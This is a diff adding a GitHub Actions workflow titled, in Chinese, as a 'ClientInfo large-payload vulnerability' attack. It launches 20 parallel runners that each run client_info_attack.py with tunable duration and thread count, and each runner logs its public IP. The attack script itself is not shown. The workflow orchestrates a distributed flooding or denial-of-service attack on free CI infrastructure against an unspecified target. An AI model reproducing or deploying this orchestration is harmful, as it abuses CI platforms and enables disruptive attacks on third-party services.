@@ -1,0 +1,58 @@
+name: "ClientInfo 大载荷漏洞 - 20并发Runner"
+
+on:
+  workflow_dispatch:
+    inputs:
+      duration:
+        description: '每个Runner攻击持续时间(秒)'
+        required: false
+        default: '120'
+        type: string
+      threads:
+        description: '每个Runner并发线程数'
+        required: false
+        default: '5'
+        type: string
+
+jobs:
+  attack:
+    name: "Node-${{ matrix.node_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        node_id: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: pip install aiohttp
+
+      - name: Display runner info
+        run: |
+          echo "🖥️  Runner IP: $(curl -s -m 5 ifconfig.me || echo 'N/A')"
+          echo "🏷️   Runner hostname: $(hostname)"
+          echo "🔢 Node ID: ${{ matrix.node_id }}"
+          echo "⏱️  Duration: ${{ github.event.inputs.duration || '120' }}s"
+          echo "🧵 Threads: ${{ github.event.inputs.threads || '5' }}"
+
+      - name: Execute client_info attack
+        run: |
+          python3 client_info_attack.py
+        env:
+          DURATION: ${{ github.event.inputs.duration || '120' }}
+          THREADS: ${{ github.event.inputs.threads || '5' }}
+          NODE_ID: ${{ matrix.node_id }}
+
+      - name: Done
+        if: always()
+        run: echo "✅ Node ${{ matrix.node_id }} 完成"
